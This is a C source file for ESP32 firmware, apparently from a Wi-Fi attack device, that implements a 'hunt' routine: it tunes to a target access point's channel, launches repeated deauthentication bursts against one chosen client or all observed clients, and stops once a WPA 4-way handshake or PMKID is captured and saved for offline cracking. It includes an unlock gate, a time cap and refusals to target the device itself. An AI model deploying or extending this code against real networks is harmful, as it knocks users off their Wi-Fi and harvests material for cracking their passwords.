#include "pwn_hunt.h"

#include <stdio.h>
#include <string.h>

#include "esp_log.h"
#include "esp_timer.h"
#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"
#include "freertos/task.h"

#include "pwn_capture.h"
#include "pwn_net.h"
#include "pwn_wifi.h"

static const char *TAG = "hunt";

#define HUNT_TASK_STACK   4096
#define HUNT_TASK_PRIO    4
#define HUNT_POLL_MS      200
#define HUNT_DEAUTH_MS    400   /* limited burst: ~2.5 rounds per second */

static SemaphoreHandle_t s_lock;
static TaskHandle_t s_task;
static volatile bool s_stop;
static volatile bool s_target_is_self_ap;
static pwn_hunt_status_t s_status;

static void status_lock(void)
{
    if (s_lock) {
        xSemaphoreTake(s_lock, portMAX_DELAY);
    }
}

static void status_unlock(void)
{
    if (s_lock) {
        xSemaphoreGive(s_lock);
    }
}

static void set_err(char *err, size_t errlen, const char *msg)
{
    if (err && errlen) {
        snprintf(err, errlen, "%s", msg ? msg : "");
    }
}

const char *pwn_hunt_state_name(pwn_hunt_state_t state)
{
    switch (state) {
    case PWN_HUNT_IDLE:     return "idle";
    case PWN_HUNT_RUNNING:  return "hunting";
    case PWN_HUNT_CAPTURED: return "captured";
    case PWN_HUNT_TIMEOUT:  return "timeout";
    case PWN_HUNT_STOPPED:  return "stopped";
    case PWN_HUNT_ERROR:    return "error";
    default:                return "?";
    }
}

void pwn_hunt_init(void)
{
    if (!s_lock) {
        s_lock = xSemaphoreCreateMutex();
    }
    s_stop = false;
    s_task = NULL;
    s_target_is_self_ap = false;
    memset(&s_status, 0, sizeof(s_status));
    s_status.state = PWN_HUNT_IDLE;
}

/* Update the running status without touching the final state fields. */
static void update_progress(uint32_t elapsed_ms, const char *message)
{
    status_lock();
    if (s_status.active) {
        s_status.elapsed_ms = elapsed_ms;
        if (message) {
            snprintf(s_status.message, sizeof(s_status.message), "%s", message);
        }
    }
    status_unlock();
}

static void finish(pwn_hunt_state_t state, const pwn_capture_hit_t *hit,
                   const char *message)
{
    TaskHandle_t me = xTaskGetCurrentTaskHandle();

    status_lock();
    s_status.state = state;
    s_status.saved = hit ? hit->saved : false;
    if (hit) {
        snprintf(s_status.ssid, sizeof(s_status.ssid), "%s", hit->ssid);
        snprintf(s_status.file, sizeof(s_status.file), "%s", hit->file);
    }
    if (message) {
        snprintf(s_status.message, sizeof(s_status.message), "%s", message);
    }
    s_status.active = false;
    if (s_task == me) {
        s_task = NULL;
    }
    status_unlock();
}

static void hunt_task(void *arg)
{
    (void)arg;
    pwn_hunt_status_t cfg;
    status_lock();
    cfg = s_status;
    status_unlock();

    uint32_t start_ms = (uint32_t)(esp_timer_get_time() / 1000);
    bool deauth_started = false;
    pwn_hunt_state_t final_state = PWN_HUNT_TIMEOUT;
    pwn_capture_hit_t final_hit;
    memset(&final_hit, 0, sizeof(final_hit));
    const char *final_msg = "hunt timed out";

    ESP_LOGW(TAG, "hunt start %02x:%02x:%02x:%02x:%02x:%02x%s%s for %ums",
             cfg.bssid[0], cfg.bssid[1], cfg.bssid[2], cfg.bssid[3],
             cfg.bssid[4], cfg.bssid[5],
             cfg.have_sta ? " sta " : "", cfg.have_sta ? "(specific)" : "",
             (unsigned)cfg.duration_ms);

    for (;;) {
        uint32_t elapsed = (uint32_t)(esp_timer_get_time() / 1000) - start_ms;

        if (s_stop) {
            final_state = PWN_HUNT_STOPPED;
            final_msg = "stopped by user";
            break;
        }
        if (!pwn_wifi_authorized()) {
            final_state = PWN_HUNT_STOPPED;
            final_msg = "attacks locked";
            break;
        }

        pwn_capture_hit_t hit;
        bool usable = capture_find_usable(cfg.bssid,
                                          cfg.have_sta ? cfg.sta : NULL,
                                          cfg.have_sta, &hit);
        if (usable && hit.saved) {
            final_state = PWN_HUNT_CAPTURED;
            final_hit = hit;
            final_msg = hit.has_pmkid ? "PMKID saved" : "4-way handshake saved";
            break;
        }
        if (usable && !capture_sd_ready() && elapsed >= 1500) {
            /* Without an SD card the frames stay in RAM; they are still
             * usable for the session, so stop the burst instead of hammering
             * the client for the full duration. */
            final_state = PWN_HUNT_CAPTURED;
            final_hit = hit;
            final_msg = "captured in RAM (SD not ready)";
            break;
        }
        if (elapsed >= cfg.duration_ms) {
            final_state = PWN_HUNT_TIMEOUT;
            if (usable) {
                final_hit = hit;
                final_msg = "capture in RAM; SD write pending";
            }
            break;
        }

        if (!deauth_started) {
            pwn_deauth_job_t job = {0};
            memcpy(job.bssid, cfg.bssid, 6);
            if (cfg.have_sta) {
                memcpy(job.sta, cfg.sta, 6);
            }
            job.have_sta = cfg.have_sta;
            job.all = !cfg.have_sta;
            job.target_is_self_ap = s_target_is_self_ap;
            job.duration_ms = cfg.duration_ms;
            job.interval_ms = HUNT_DEAUTH_MS;
            job.reason = 1;
            esp_err_t err = pwn_wifi_deauth_start(&job);
            if (err != ESP_OK) {
                final_state = PWN_HUNT_ERROR;
                final_msg = "deauth worker unavailable";
                break;
            }
            deauth_started = true;
            update_progress(elapsed, cfg.have_sta
                                      ? "deauthing selected client"
                                      : "deauthing observed clients");
        }

        vTaskDelay(pdMS_TO_TICKS(HUNT_POLL_MS));
    }

    if (deauth_started) {
        pwn_wifi_deauth_stop();
    }

    uint32_t elapsed = (uint32_t)(esp_timer_get_time() / 1000) - start_ms;
    status_lock();
    s_status.elapsed_ms = elapsed;
    status_unlock();
    finish(final_state, final_hit.found ? &final_hit : NULL, final_msg);

    ESP_LOGW(TAG, "hunt %s after %ums%s%s", pwn_hunt_state_name(final_state),
             (unsigned)elapsed,
             final_hit.file[0] ? ": " : "",
             final_hit.file[0] ? final_hit.file : "");

    vTaskDelete(NULL);
}

esp_err_t pwn_hunt_start(const uint8_t bssid[6], const uint8_t *sta,
                         uint32_t duration_ms, char *err, size_t errlen)
{
    if (err && errlen) {
        err[0] = 0;
    }
    if (!s_lock) {
        pwn_hunt_init();
    }
    if (!bssid || (bssid[0] | bssid[1] | bssid[2] |
                   bssid[3] | bssid[4] | bssid[5]) == 0) {
        set_err(err, errlen, "bssid required");
        return ESP_ERR_INVALID_ARG;
    }
    if (!pwn_wifi_authorized()) {
        set_err(err, errlen, "unlock attacks first");
        return ESP_ERR_INVALID_STATE;
    }

    uint8_t self[6];
    pwn_wifi_self_mac(self);
    if (memcmp(bssid, self, 6) == 0) {
        set_err(err, errlen, "refusing to target this device");
        return ESP_ERR_INVALID_ARG;
    }
    if (sta) {
        if ((sta[0] | sta[1] | sta[2] | sta[3] | sta[4] | sta[5]) == 0) {
            set_err(err, errlen, "invalid station");
            return ESP_ERR_INVALID_ARG;
        }
        if (memcmp(sta, self, 6) == 0) {
            set_err(err, errlen, "refusing to deauth this device");
            return ESP_ERR_INVALID_ARG;
        }
    }

    if (duration_ms == 0) {
        duration_ms = PWN_HUNT_DEFAULT_MS;
    }
    if (duration_ms < PWN_HUNT_MIN_MS) {
        duration_ms = PWN_HUNT_MIN_MS;
    }
    if (duration_ms > PWN_HUNT_MAX_MS) {
        duration_ms = PWN_HUNT_MAX_MS;
    }

    status_lock();
    bool busy = s_status.active || s_task;
    status_unlock();
    if (busy) {
        set_err(err, errlen, "a hunt is already running");
        return ESP_ERR_INVALID_STATE;
    }

    pwn_ap_t ap;
    bool have_ap = pwn_wifi_ap_get(bssid, &ap);
    if (!have_ap) {
        set_err(err, errlen, "target AP not in scan table; rescan first");
        return ESP_ERR_NOT_FOUND;
    }

    pwn_net_status_t net;
    net_get_status(&net);
    bool self_ap = net.connected && memcmp(net.bssid, bssid, 6) == 0;

    const pwn_wifi_stats_t *wst = pwn_wifi_stats();
    if (ap.channel && ap.channel != wst->channel) {
        if (net.connected) {
            set_err(err, errlen,
                    "single radio is pinned to your AP channel; "
                    "pick a target on the current channel");
            return ESP_ERR_INVALID_STATE;
        }
        esp_err_t e = pwn_wifi_force_channel(ap.channel);
        if (e != ESP_OK) {
            set_err(err, errlen, "cannot tune to the target channel");
            return e;
        }
    }

    status_lock();
    if (s_status.active || s_task) {
        status_unlock();
        set_err(err, errlen, "a hunt is already running");
        return ESP_ERR_INVALID_STATE;
    }

    s_stop = false;
    s_target_is_self_ap = self_ap;
    memset(&s_status, 0, sizeof(s_status));
    s_status.state = PWN_HUNT_RUNNING;
    s_status.active = true;
    memcpy(s_status.bssid, bssid, 6);
    if (sta) {
        memcpy(s_status.sta, sta, 6);
    }
    s_status.have_sta = (sta != NULL);
    s_status.pmf = ap.pmf;
    s_status.duration_ms = duration_ms;
    snprintf(s_status.ssid, sizeof(s_status.ssid), "%s", ap.ssid);
    snprintf(s_status.message, sizeof(s_status.message), "hunt starting");

    BaseType_t ok = xTaskCreate(hunt_task, "pwn_hunt", HUNT_TASK_STACK,
                                NULL, HUNT_TASK_PRIO, &s_task);
    if (ok != pdPASS) {
        s_task = NULL;
        s_status.active = false;
        s_status.state = PWN_HUNT_ERROR;
        snprintf(s_status.message, sizeof(s_status.message),
                 "hunt task create failed");
        status_unlock();
        set_err(err, errlen, "hunt task create failed");
        return ESP_ERR_NO_MEM;
    }
    status_unlock();

    if (ap.pmf) {
        ESP_LOGW(TAG, "target advertises PMF; deauth may be ignored");
    }
    return ESP_OK;
}

void pwn_hunt_stop(void)
{
    if (s_task) {
        s_stop = true;
    }
}

bool pwn_hunt_active(void)
{
    bool active = false;
    status_lock();
    active = s_status.active;
    status_unlock();
    return active;
}

void pwn_hunt_status(pwn_hunt_status_t *out)
{
    if (!out) {
        return;
    }
    status_lock();
    *out = s_status;
    status_unlock();
}
